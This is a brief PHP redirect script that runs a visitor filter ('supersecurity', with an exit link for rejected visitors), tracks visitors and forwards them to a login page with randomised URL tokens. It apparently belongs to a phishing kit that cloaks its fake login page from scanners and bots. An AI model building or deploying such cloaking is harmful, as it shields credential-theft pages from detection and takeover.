<?php
session_start();
require_once '../includes/functions.php';
require_once '../includes/tracker.php';
require_once '../includes/absd.php';
$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
validateVisit();
$visitor = trackVisitor();
header('location: ./login.php?valid='.gurl().'&'.gurl().'');
?>
